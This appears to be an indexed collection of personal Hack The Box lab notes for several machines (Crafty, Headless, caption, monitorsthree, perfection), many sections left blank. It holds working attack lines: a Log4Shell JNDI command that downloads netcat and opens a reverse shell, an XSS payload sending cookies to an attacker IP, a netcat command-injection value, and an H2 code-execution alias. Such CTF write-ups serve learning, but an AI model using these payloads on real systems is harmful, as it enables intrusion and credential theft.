</p>"},{"location":"Machines/HTB_Bizness/notes/#privilege-escalation","title":"Privilege Escalation","text":"<p>After basic enumeration, we found a port for ofbizsetup. Searching for something interesting on the documentation, we find out : - that it is always connected to a database. - In <code>/framework/security/security.properties</code>we see that SHA is used for hashing passwords. - Apache Derby is the db per default.</p> <p>Once we know that the database is called Derby, we found out that there is a directory <code>/opt/ofbiz/runtime/data/derby</code>.</p> <p>If we imported and check it with <code>derby-tools</code> we find a hash:</p> <p>![[Pasted image 20240816215302.png]]</p> <p>Looking for credentials, OFZBiz has a database. We can export it and then look on the USER_LOGIN table to find admin's hash.</p>"},{"location":"Machines/HTB_Bizness/notes/#developed-map","title":"Developed map","text":"<p>![[Bizness10.10.11.252.jpg]]</p>"},{"location":"Machines/HTB_Bizness/notes/#sources","title":"Sources","text":"<p>[[https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz/blob/main/ofbiz_exploit.py]]</p> <p>[[https://blog.sonicwall.com/en-us/2023/12/sonicwall-discovers-critical-apache-ofbiz-zero-day-authbiz/]] [[https://db.apache.org/derby/docs/10.0/manuals/tools/tools23.html]]</p> <p>[[https://github.com/frohoff/ysoserial]]</p>"},{"location":"Machines/HTB_Crafty/commands/","title":"Commands","text":"<pre><code>sudo apt install maven\n</code></pre> <pre><code>git clone https://github.com/veracode-research/rogue-jndi.git\ncd rogue-jndi\nmvn package\n</code></pre> <pre><code>wget https://github.com/vinsworldcom/NetCat64/releases/download/1.11.6.4/nc64.exe\npython3 -m http.server\n</code></pre> <pre><code>java -jar target/RogueJndi-1.1.jar --command \"powershell.exe iwr\nhttp://10.10.16.9:8080/nc64.exe -O c:\\windows\\temp\\nc64.exe;\nc:\\windows\\temp\\nc64.exe 10.10.16.9 4444 -e cmd.exe\" --hostname \"10.10.16.9\"\n</code></pre> <p>minecraft-cli:</p> <pre><code>/send ${jndi:ldap://10.10.14.48:1389/o=reference}\n</code></pre>"},{"location":"Machines/HTB_Crafty/notes/","title":"Notes","text":"Name Crafty Platform HTB Difficulty Easy OS Windows Used techniques Known vulnerability, log4s Technologies minecraft, IIS, JNDI Tools nmap, minecraft-client, Rogue-jndi CVEs"},{"location":"Machines/HTB_Crafty/notes/#enumeration","title":"Enumeration","text":"<p>tcp 80:</p> <pre><code>http://crafty.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.249], JQuery[3.6.0], Microsoft-IIS[10.0], Script[text/javascript], Title[Crafty - Official Website]\n</code></pre>"},{"location":"Machines/HTB_Crafty/notes/#que-es-jndi","title":"\u00bfQu\u00e9 es JNDI?","text":"<p>JNDI es una API en Java que proporciona un servicio de directorio y nombres, permitiendo a las aplicaciones Java descubrir y buscar datos y recursos utilizando nombres. JNDI se usa com\u00fanmente para:</p> <ul> <li>Buscar objetos remotos en servidores RMI (Remote Method Invocation).</li> <li>Conectar a servicios LDAP (Lightweight Directory Access Protocol).</li> <li>Registrar y buscar recursos como bases de datos, colas de mensajer\u00eda, etc.</li> </ul>"},{"location":"Machines/HTB_Crafty/notes/#jndi-injection","title":"JNDI injection:","text":"<p>La inyecci\u00f3n JNDI (Java Naming and Directory Interface Injection) es una vulnerabilidad de seguridad que ocurre cuando una aplicaci\u00f3n Java acepta entradas no confiables y las utiliza en consultas JNDI sin la debida validaci\u00f3n o sanitizaci\u00f3n</p>"},{"location":"Machines/HTB_Crafty/notes/#directories","title":"Directories","text":""},{"location":"Machines/HTB_Crafty/notes/#subdomains","title":"subdomains","text":""},{"location":"Machines/HTB_Crafty/notes/#foothold","title":"Foothold","text":""},{"location":"Machines/HTB_Crafty/notes/#lateral-movement","title":"Lateral Movement","text":""},{"location":"Machines/HTB_Crafty/notes/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Machines/HTB_Crafty/notes/#developed-map","title":"Developed map","text":""},{"location":"Machines/HTB_Crafty/notes/#sources","title":"Sources","text":"<p>[[https://www.youtube.com/watch?v=w2F67LbEtnk]] [[https://github.com/o7-Fire/Log4Shell]] [[https://medium.com/@hackingvarangian/log4shell-vulnerability-part-1-minecraft-poc-ef770e5800de]]</p>"},{"location":"Machines/HTB_Devel/notes/","title":"Notes","text":"Name Usage Platform HTB Difficulty Easy OS Windows Used techniques sudomain enumeration,  SQLi, crack hashes, File Upload attack, credentials finding, reverse, wildcards spare tricks. Technologies IIS Tools gobuster,  BurpSuite, sqlmap, nc, strings CVEs cve-2023-24249"},{"location":"Machines/HTB_Devel/notes/#enumeration","title":"Enumeration","text":""},{"location":"Machines/HTB_Devel/notes/#directories","title":"Directories","text":""},{"location":"Machines/HTB_Devel/notes/#subdomains","title":"subdomains","text":""},{"location":"Machines/HTB_Devel/notes/#foothold","title":"Foothold","text":""},{"location":"Machines/HTB_Devel/notes/#lateral-movement","title":"Lateral Movement","text":""},{"location":"Machines/HTB_Devel/notes/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Machines/HTB_Devel/notes/#developed-map","title":"Developed map","text":""},{"location":"Machines/HTB_Devel/notes/#sources","title":"Sources","text":""},{"location":"Machines/HTB_Headless/commands/","title":"Commands","text":"<pre><code>rustscan -t 1500 -a 10.10.11.8 -- -sC\n</code></pre> <p>2 ports:</p> <pre><code>rustscan -t 10000 -u 5000 -b 500 -a 10.10.11.8\n</code></pre> <pre><code>\u2514\u2500\u2500\u257c $ sudo nmap -p22,5000 10.10.11.8 -sCV\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-23 19:23 CEST\nNmap scan report for 10.10.11.8\nHost is up (0.067s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)\n| ssh-hostkey:\n|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)\n|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)\n5000/tcp open  upnp?\n| fingerprint-strings:\n|   GetRequest:\n|     HTTP/1.1 200 OK\n|     Server: Werkzeug/2.2.2 Python/3.11.2\n|     Date: Tue, 23 Jul 2024 17:23:22 GMT\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 2799\n|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/\n|     Connection: close\n|     &lt;!DOCTYPE html&gt;\n|     &lt;html lang=\"en\"&gt;\n|     &lt;head&gt;\n|     &lt;meta charset=\"UTF-8\"&gt;\n|     &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n|     &lt;title&gt;Under Construction&lt;/title&gt;\n|     &lt;style&gt;\n|     body {\n|     font-family: 'Arial', sans-serif;\n|     background-color: #f7f7f7;\n|     margin: 0;\n|     padding: 0;\n|     display: flex;\n|     justify-content: center;\n|     align-items: center;\n|     height: 100vh;\n|     .container {\n|     text-align: center;\n|     background-color: #fff;\n|     border-radius: 10px;\n|     box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);\n|   RTSPRequest:\n|     &lt;!DOCTYPE HTML&gt;\n|     &lt;html lang=\"en\"&gt;\n|     &lt;head&gt;\n|     &lt;meta charset=\"utf-8\"&gt;\n|     &lt;title&gt;Error response&lt;/title&gt;\n|     &lt;/head&gt;\n|     &lt;body&gt;\n|     &lt;h1&gt;Error response&lt;/h1&gt;\n|     &lt;p&gt;Error code: 400&lt;/p&gt;\n|     &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;\n|     &lt;p&gt;Error code explanation: 400 - Bad request syntax or unsupported method.&lt;/p&gt;\n|     &lt;/body&gt;\n|_    &lt;/html&gt;\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port5000-TCP:V=7.94SVN%I=7%D=7/23%Time=669FE709%P=x86_64-pc-linux-gnu%r\nSF:(GetRequest,BE1,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Werkzeug/2\\.2\\.2\\\nSF:x20Python/3\\.11\\.2\\r\\nDate:\\x20Tue,\\x2023\\x20Jul\\x202024\\x2017:23:22\\x2\nSF:0GMT\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\nSF:\\x202799\\r\\nSet-Cookie:\\x20is_admin=InVzZXIi\\.uAlmXlTvm8vyihjNaPDWnvB_Z\nSF:fs;\\x20Path=/\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\\nSF:x20lang=\\\"en\\\"&gt;\\n&lt;head&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\\"UTF-8\\\"&gt;\\n\\\nSF:x20\\x20\\x20\\x20&lt;meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=device-wid\nSF:th,\\x20initial-scale=1\\.0\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;title&gt;Under\\x20Construct\nSF:ion&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;style&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20b\nSF:ody\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20font-family:\\\nSF:x20'Arial',\\x20sans-serif;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20background-color:\\x20#f7f7f7;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20margin:\\x200;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20padding:\\x200;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20di\nSF:splay:\\x20flex;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20justif\nSF:y-content:\\x20center;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:align-items:\\x20center;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20height:\\x20100vh;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20}\\n\\n\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20\\x20\\.container\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20text-align:\\x20center;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20\\x20background-color:\\x20#fff;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20border-radius:\\x2010px;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20box-shadow:\\x200px\\x200px\\x2020px\\x20rgba\\(0,\\x20\nSF:0,\\x200,\\x200\\.2\\);\\n\\x20\\x20\\x20\\x20\\x20\")%r(RTSPRequest,16C,\"&lt;!DOCTYP\nSF:E\\x20HTML&gt;\\n&lt;html\\x20lang=\\\"en\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;head&gt;\\n\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20&lt;title&gt;Error\\x20response&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;/head&gt;\\n\\x\nSF:20\\x20\\x20\\x20&lt;body&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;h1&gt;Error\\x20resp\nSF:onse&lt;/h1&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Error\\x20code:\\x20400&lt;/p&gt;\nSF:\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Message:\\x20Bad\\x20request\\x20vers\nSF:ion\\x20\\('RTSP/1\\.0'\\)\\.&lt;/p&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Error\\\nSF:x20code\\x20explanation:\\x20400\\x20-\\x20Bad\\x20request\\x20syntax\\x20or\\x\nSF:20unsupported\\x20method\\.&lt;/p&gt;\\n\\x20\\x20\\x20\\x20&lt;/body&gt;\\n&lt;/html&gt;\\n\");\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 101.21 seconds\n\n</code></pre> <p>Payload cookie stealing:</p> <p><code>&lt;img src=x onerror=\"location.href='http://10.10.16.13:8000/?c=\"+document.cookie&gt;</code></p> <p>Payload shell: <code>date=2023-09-27;nc%2010.10.16.13%201234%20-e%20%2Fbin%2Fbash</code></p> <p>PrivEsc:</p> <pre><code>cd /tmp\necho \"bash\" &gt; initdb.sh\nsudo /usr/bin/syscheck\n</code></pre>"},{"location":"Machines/HTB_Headless/notes/","title":"Notes","text":"Name Headless Platform HTB Difficulty Easy OS Linux Used techniques DOM XSS, Header injection, Command Injection, relative path Technologies web app Tools nmap, nc, CVEs none"},{"location":"Machines/HTB_Headless/notes/#enumeration","title":"Enumeration","text":"<p>![[Pasted image 20240724154028.png]]</p> <p>Two open ports, one corresponds to ssh and the other to some http service with no information about the domain or technologies. </p> <p>![[Pasted image 20240724154210.png]]</p>"},{"location":"Machines/HTB_Headless/notes/#directories","title":"Directories","text":"<ul> <li>/support<ul> <li>Possible injection, but it seems sanitized when we try basic xss. After trying some xss, one message shows up and</li> </ul> </li> </ul> <p>![[Pasted image 20240724154539.png]]</p> <p>There we can see that there is a cookie that can be used to personify as admin, and that this request has been sent to the administrators for investigation.</p> <ul> <li>/dashboard<ul> <li>no Authorization. There we may need the token from above.</li> </ul> </li> </ul>"},{"location":"Machines/HTB_Headless/notes/#subdomains","title":"Subdomains","text":"<p>none.</p>"},{"location":"Machines/HTB_Headless/notes/#foothold","title":"Foothold","text":"<p>The successful injection occurs on the User-Agent header, there we can paste the payload and wait till the administrators checks the hacking attempt. </p> <p>![[Pasted image 20240724153903.png]]</p> <p>Once we got the admin token, we can visit /dashboard. There, there is just one functionality \"Generate Report\". If we inspect the request made, we can inject commands in the \"date\" parameter:</p> <p>![[Pasted image 20240724153950.png]]</p> <p>![[Pasted image 20240724145618.png]]</p>"},{"location":"Machines/HTB_Headless/notes/#lateral-movement","title":"Lateral Movement","text":"<p>No other users.</p>"},{"location":"Machines/HTB_Headless/notes/#privilege-escalation","title":"Privilege Escalation","text":"<p>Once we are dvir,  with basic enumeration we can see that we can execute one script as sudo. If we check it, we can realize that one script is executed using his relative path. </p> <p>![[Pasted image 20240724151628.png]]</p> <p>Exploitation in this case is direct: just create a initdb.sh which executes bash and then execute /usr/bin/syscheck in the same directory.</p>"},{"location":"Machines/HTB_Headless/notes/#developed-map","title":"Developed map","text":"<p>![[Headless10.10.16.8.jpg]]</p>"},{"location":"Machines/HTB_Headless/notes/#sources","title":"Sources","text":"<p>[[https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#xss-common-payloads]]</p>"},{"location":"Machines/HTB_Pov/notes/","title":"Notes","text":"Name Usage Platform HTB Difficulty Medium OS Windows Used techniques Technologies file disclosure Tools gobuster,  BurpSuite, sqlmap, nc, strings CVEs cve-2023-24249"},{"location":"Machines/HTB_Pov/notes/#enumeration","title":"Enumeration","text":"<p>![[Pasted image 20240912050008.png]]</p>"},{"location":"Machines/HTB_Pov/notes/#directories","title":"Directories","text":"<p>none</p>"},{"location":"Machines/HTB_Pov/notes/#subdomains","title":"subdomains","text":"<p>dev.pov.htb</p>"},{"location":"Machines/HTB_Pov/notes/#foothold","title":"Foothold","text":""},{"location":"Machines/HTB_Pov/notes/#lateral-movement","title":"Lateral Movement","text":""},{"location":"Machines/HTB_Pov/notes/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Machines/HTB_Pov/notes/#developed-map","title":"Developed map","text":""},{"location":"Machines/HTB_Pov/notes/#sources","title":"Sources","text":""},{"location":"Machines/HTB_Sightless/notes/","title":"Notes","text":"Name Usage Platform HTB Difficulty Easy OS Linux Used techniques Technologies Tools CVEs"},{"location":"Machines/HTB_Sightless/notes/#enumeration","title":"Enumeration","text":""},{"location":"Machines/HTB_Sightless/notes/#directories","title":"Directories","text":""},{"location":"Machines/HTB_Sightless/notes/#subdomains","title":"subdomains","text":""},{"location":"Machines/HTB_Sightless/notes/#foothold","title":"Foothold","text":""},{"location":"Machines/HTB_Sightless/notes/#lateral-movement","title":"Lateral Movement","text":""},{"location":"Machines/HTB_Sightless/notes/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Machines/HTB_Sightless/notes/#developed-map","title":"Developed map","text":""},{"location":"Machines/HTB_Sightless/notes/#sources","title":"Sources","text":"<p>[[https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb]] [[https://github.com/froxlor/Froxlor/security/advisories/GHSA-x525-54hf-xr53]] [[https://thedutchhacker.com/how-to-crack-a-keepass-database-file/]]</p>"},{"location":"Machines/HTB_caption/notes/","title":"Notes","text":"Name Caption Platform HTB Difficulty Hard OS Linux Used techniques default credentials, command injection, code review, repositorz Technologies gitbucket, Apache Thrift, go Tools python CVEs none"},{"location":"Machines/HTB_caption/notes/#enumeration","title":"Enumeration","text":"<p>git bucket default creds: root:root h2 database panel admin SELECT CAST(FILE_READ('/etc/apache2/conf-available/apache2.conf', NULL) AS VARCHAR(10000));</p>"},{"location":"Machines/HTB_caption/notes/#directories","title":"Directories","text":""},{"location":"Machines/HTB_caption/notes/#subdomains","title":"subdomains","text":""},{"location":"Machines/HTB_caption/notes/#foothold","title":"Foothold","text":"<pre><code>CREATE ALIAS REVEXEC AS $$ String shellexec(String cmd) throws java.io.IOException{\n    java.util.Scanner s=new\n    java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\");\n    return s.hasNext() ? s.next() : \"\"; }$$;\n\n\nCALL REVEXEC('id')\n\n</code></pre>"},{"location":"Machines/HTB_caption/notes/#lateral-movement","title":"Lateral Movement","text":""},{"location":"Machines/HTB_caption/notes/#privilege-escalation","title":"Privilege Escalation","text":"<p>gitbucket </p>"},{"location":"Machines/HTB_caption/notes/#developed-map","title":"Developed map","text":""},{"location":"Machines/HTB_caption/notes/#sources","title":"Sources","text":"<p>[[https://medium.com/r3d-buck3t/chaining-h2-database-vulnerabilities-for-rce-9b535a9621a2]]</p>"},{"location":"Machines/HTB_caption/scripts/","title":"Scripts","text":""},{"location":"Machines/HTB_caption/scripts/#copiar-log_service","title":"Copiar log_service:","text":"<p>namespace go log_service</p> <pre><code>service LogService {\n    string ReadLogFile(1: string filePath)\n}\n</code></pre>"},{"location":"Machines/HTB_caption/scripts/#generar-el-cliente-python-a-partir-del-archivo-anterior","title":"Generar el cliente Python a partir del archivo anterior:","text":"<pre><code>thrift --gen py log_service.thrift\n</code></pre> <p>Esto generar\u00e1 un directorio <code>gen-py</code> con los archivos necesarios para el cliente en Python. Aseg\u00farate de tener instalado Thrift en tu sistema, y si no lo tienes, puedes instalarlo con:</p> <pre><code>import sys\n\nsys.path.append('/home/endiku/HTB/Maquinas/HTB_caption/content/gen-py')\n\n\n\nfrom thrift import Thrift\n\nfrom thrift.transport import TSocket\n\nfrom thrift.transport import TTransport\n\nfrom thrift.protocol import TBinaryProtocol\n\nfrom log_service import LogService # Importa el cliente generado por Thrift\n\n\n\ndef main():\n\ntry:\n\n# Crear socket y conectar al servidor en localhost:9090\n\ntransport = TSocket.TSocket('localhost', 9090)\n\n# Usar un transporte con buffer\n\ntransport = TTransport.TBufferedTransport(transport)\n\n# Usar el protocolo binario para la comunicaci\u00f3n\n\nprotocol = TBinaryProtocol.TBinaryProtocol(transport)\n\n# Crear un cliente del servicio LogService\n\nclient = LogService.Client(protocol)\n\n# Abrir la conexi\u00f3n\n\ntransport.open()\n\n\n\n# Llamar al m\u00e9todo ReadLogFile con la ruta del archivo\n\nfilePath = \"/tmp/tmp2/test\"\n\ncontent = client.ReadLogFile(filePath)\n\n# Mostrar el contenido del archivo\n\nprint(\"Contenido del archivo:\", content)\n\n\n\nwith open('output_cliente.log', 'w') as f:\n\nf.write(content)\n\n\n\n# Cerrar el transporte\n\ntransport.close()\n\n\n\nexcept Thrift.TException as tx:\n\nprint(f'Error: {tx.message}')\n\n\n\nif __name__ == \"__main__\":\n\nmain()\n</code></pre> <p>script:</p>"},{"location":"Machines/HTB_cicada/Commands/","title":"Commands","text":"<p>nxc smb 10.10.11.35 -u 'guest' -p '' nxc smb 10.10.11.35 -u 'guest' -p '' --shares nxc smb 10.10.11.35 -u 'guest' -p '' --rid-brute (todos los usuarios)</p> <pre><code>ldapdomaindump ldap://10.129.118.121 -u 'cicada.htb\\michael.wrightson' -p '$PASS'`\n</code></pre> <p><code>evil-winrm -i 'cicada.htb' -u 'emily.oscars' -p '[REDACTED]'</code></p>"},{"location":"Machines/HTB_cicada/notes/","title":"Notes","text":"Name Usage Platform HTB Difficulty Easy OS Linux Used techniques sudomain enumeration,  SQLi, crack hashes, File Upload attack, credentials finding, reverse, wildcards spare tricks. Technologies Laravel, Laravel-admin Tools gobuster,  BurpSuite, sqlmap, nc, strings CVEs cve-2023-24249"},{"location":"Machines/HTB_cicada/notes/#enumeration","title":"Enumeration","text":""},{"location":"Machines/HTB_cicada/notes/#directories","title":"Directories","text":""},{"location":"Machines/HTB_cicada/notes/#subdomains","title":"subdomains","text":""},{"location":"Machines/HTB_cicada/notes/#foothold","title":"Foothold","text":""},{"location":"Machines/HTB_cicada/notes/#lateral-movement","title":"Lateral Movement","text":""},{"location":"Machines/HTB_cicada/notes/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Machines/HTB_cicada/notes/#developed-map","title":"Developed map","text":""},{"location":"Machines/HTB_cicada/notes/#sources","title":"Sources","text":"<p>[[https://loghmariala.github.io/posts/Cicada/]] [[https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/]]</p>"},{"location":"Machines/HTB_iClean/notes/","title":"Notes","text":"Name Clean Platform HTB Difficulty Medium OS Linux Used techniques Technologies Tools CVEs"},{"location":"Machines/HTB_iClean/notes/#enumeration","title":"Enumeration","text":""},{"location":"Machines/HTB_iClean/notes/#directories","title":"Directories","text":""},{"location":"Machines/HTB_iClean/notes/#subdomains","title":"subdomains","text":""},{"location":"Machines/HTB_iClean/notes/#foothold","title":"Foothold","text":""},{"location":"Machines/HTB_iClean/notes/#lateral-movement","title":"Lateral Movement","text":""},{"location":"Machines/HTB_iClean/notes/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Machines/HTB_iClean/notes/#developed-map","title":"Developed map","text":""},{"location":"Machines/HTB_iClean/notes/#sources","title":"Sources","text":""},{"location":"Machines/HTB_lantern/notes/","title":"Notes","text":"Name Lantern Platform HTB Difficulty Hard OS Linux Used techniques Technologies Tools CVEs cve-2023-24249"},{"location":"Machines/HTB_lantern/notes/#enumeration","title":"Enumeration","text":""},{"location":"Machines/HTB_lantern/notes/#directories","title":"Directories","text":""},{"location":"Machines/HTB_lantern/notes/#subdomains","title":"subdomains","text":""},{"location":"Machines/HTB_lantern/notes/#foothold","title":"Foothold","text":""},{"location":"Machines/HTB_lantern/notes/#lateral-movement","title":"Lateral Movement","text":""},{"location":"Machines/HTB_lantern/notes/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Machines/HTB_lantern/notes/#developed-map","title":"Developed map","text":""},{"location":"Machines/HTB_lantern/notes/#sources","title":"Sources","text":""},{"location":"Machines/HTB_monitorsthree/notes/","title":"Notes","text":"Name Monitorsthree Platform HTB Difficulty Medium OS Linux Used techniques sudomain enumeration,  SQLi, known vulnerability Technologies cacti, duplicati Tools gobuster,  BurpSuite, sqlmap, nc CVEs"},{"location":"Machines/HTB_monitorsthree/notes/#enumeration","title":"Enumeration","text":"<p>Ports 22 and 80 open, with nginx server running on a Ubuntu:</p> <pre><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)\n|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: MonitorsThree - Networking Solutions\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>"},{"location":"Machines/HTB_monitorsthree/notes/#web-enumeration","title":"Web Enumeration","text":"<pre><code>http://monitorsthree.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sales@monitorsthree.htb], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.30], JQuery, Script, Title[MonitorsThree - Networking Solutions], X-UA-Compatible[IE=edge], nginx[1.18.0]\n</code></pre> <p>/login.php and forgot_password.php, but none of them is vulnerable to injections.</p>"},{"location":"Machines/HTB_monitorsthree/notes/#subdomain-enumeration","title":"Subdomain enumeration","text":"<p>cacti.monitorsthree.htb shows up. If we visit it, we can find a login page with version number from the software.</p> <p>![[Pasted image 20240829193534.png]]</p> <p>A little bit of research and we see it has vulnerabilities:</p> <p>![[Pasted image 20240829193811.png]]</p> <p>It does not work because we are not authenticated and we still don't know any old password.</p> <p>Directory enumeration takes us to cacti.monitorsthree.htb/app/, which is a copy of the main page. If we try the same injections, we find out that it has not all the functionalities like the production page. If we try SQLi, we find that it is vulnerable:</p> <p>![[Pasted image 20240829194314.png]]</p>"},{"location":"Machines/HTB_monitorsthree/notes/#foothold","title":"Foothold","text":"<p>Once we know it is vulnerable to SQLi, let's run sqlmap. And we get credentials for admin:</p> <p>![[Pasted image 20240829195023.png]]</p> <p>Now we can test the above vulnerabilities and get RCE.</p> <p>![[Pasted image 20240829201946.png]]</p>"},{"location":"Machines/HTB_monitorsthree/notes/#getting-all","title":"Getting all","text":"<p>After looking up everywhere, we found some credentials in config.php to another db which does not give much more privileges. </p> <p>If we check network status, we see that the host is connected to two private networks (one docker) and tcp port 8200 is open.</p> <pre><code>chisel server -p 9999 --reverse #attacker machine\nchisel client 10.0.0.1:9999 R:8090:172.16.22.2:8000\n</code></pre> <p>Once we portfwd 8200 with chisel, we see that is duplicati running.</p> <p>![[Pasted image 20240829203234.png]]</p> <p>Googling what duplicati is and if there are vulnerabilities, we found out that it can be bypassed.</p> <p>![[Pasted image 20240829204344.png]]</p> <p>Here, we can back up /marcus and /root and take flags.</p>"},{"location":"Machines/HTB_monitorsthree/notes/#sources","title":"Sources","text":"<p>[[https://github.com/Cacti/cacti/releases]] [[https://www.stationx.net/sqlmap-cheat-sheet/]] [[https://github.com/duplicati/duplicati/issues/5197]] [[https://n3nu.medium.com/how-to-pivot-using-chisel-e59b1987e252]] [[https://ap3x.github.io/posts/pivoting-with-chisel/]]</p>"},{"location":"Machines/HTB_perfection/notes/","title":"Notes","text":"Name Perfection Platform HTB Difficulty Easy OS Linux Used techniques input validation bypass, SSTI, attack mask cracking, sudo -l Technologies Ruby, sqlite Tools hashcat, burpsuit CVEs"},{"location":"Machines/HTB_perfection/notes/#enumeration","title":"Enumeration","text":"<p>![[Pasted image 20240706184117.png]]</p> <pre><code>\u2514\u2500\u2500\u257c $ whatweb 10.10.11.253\nhttp://10.10.11.253 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx, WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)], IP[10.10.11.253], PoweredBy[WEBrick], Ruby[3.0.2], Script, Title[Weighted Grade Calculator], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block]\n</code></pre> <p>==Important: WEBrick 1.7.0, Ruby[3.0.2], nginx==</p> <p>May be vulnerable WEBrick 1.7.0</p> <p>Possible users on web: tina smith, susan miller.</p>"},{"location":"Machines/HTB_perfection/notes/#directories","title":"Directories","text":"<p>Just the ones in the web site.</p>"},{"location":"Machines/HTB_perfection/notes/#subdomains","title":"Subdomains","text":"<p>No subdomains.</p>"},{"location":"Machines/HTB_perfection/notes/#foothold","title":"Foothold","text":"<p>Functionality on /weighted-grade-calc.</p> <p>\"Malicious input blocked\" message if we try to some injection. What should we look for? SQLi makes no sense since we are not requesting for data, however it makes \"calculations\", that means that somehow it interprets the input. It should be noted that it also reflects the input, so we ca go for XSS, but I may no be useful since it is a client-side vulnerability. First, we have to bypass this input validation. How may be able to bypass it? </p> <ul> <li>Character that may work: ; , . \" ' |  \\n </li> <li>Url encode list before and try to inject XSS.</li> </ul> <p>In works if we use \\n url encoded (%0A):</p> <p>![[Pasted image 20240706202808.png]]</p> <p>Reflected XSS, client-side, no chance to SSRF. </p> <p>Now what? As it interprets our input it may be using a template, so we can try SSTI. </p> <p>Ruby is on back-end, let's use his sintax:</p> <p>![[Pasted image 20240707104622.png]]</p> <p>We got RCE, let's go for shell. Python3 payload + urlencoded.</p> <p>![[Pasted image 20240707105647.png]]</p>"},{"location":"Machines/HTB_perfection/notes/#privilege-escalation","title":"Privilege Escalation","text":"<p>Credentials store in ~/Migration/pupilpath_credentials.db</p> <pre><code>find / -name \"*sql*\" 2&gt;/dev/null\nsqlite3\n</code></pre> <p>Impossible to crack. If we look further looking for credential, we will find an email which says how the password should look like. 